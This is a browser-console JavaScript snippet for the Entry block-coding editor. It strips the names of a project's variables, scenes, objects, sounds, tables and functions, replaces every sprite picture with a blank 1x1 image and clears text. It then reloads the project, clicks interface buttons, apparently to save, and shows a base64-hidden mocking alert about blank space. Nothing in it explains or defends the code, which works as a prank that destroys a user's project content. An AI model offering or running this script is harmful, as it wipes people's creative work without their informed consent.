var project = Entry.exportProject()

for (let i of project.variables) {
    i.name = ""
}
for (let i of project.messages) {
    i.name = ""
}
for (let i of project.scenes) {
    i.name = ""
}
for (let i of project.objects) {
    i.name = " "
    if (i.objectType == "sprite") {
        for (let j of i.sprite.pictures) {
            j.name = ""
            j.dimension.height = 1
            j.dimension.width = 1
            j.filename = ""
            j.fileurl = "/lib/entry-js/images/_1x1.png"
            j.imageType = "png"
            j.thumbUrl = "/lib/entry-js/images/_1x1.png"
        }
    }
    else {
        i.text = ""
    }
    for (let j of i.sprite.sounds) {
        j.name = ""
    }
}
for (let i of project.tables) {
    i.name = " "
    for (let j of i.chart) {
        j.title = ""
    }
}
for (let i of project.functions) {
    for (let j of i.localVariables) {
        j.name = ""
    }
}

Entry.clearProject()
Entry.loadProject(project)

for (i in Entry.variableContainer.functions_) {
    for (j in Entry.variableContainer.functions_[i].content._blockMap) {
      k = Entry.variableContainer.functions_[i].content._blockMap[j]
      if (k.data.type == 'function_field_label') k.data.params[0] = ""
    }
}

document.querySelector(".css-9qnihu").click()
setTimeout(() => {
    document.querySelector(".item__p5HkM").click()
}, 100)

alerting = setInterval(() => {
    if (document.querySelector(".entry-modal-confirm")) {
        alert(decodeURIComponent(escape(atob("7Jes67Cx7J2YIOuvuCDsoovslYTtlZjsi5zrgpjsmpQ/IDop"))))
        clearInterval(alerting)
    }
}, 100)
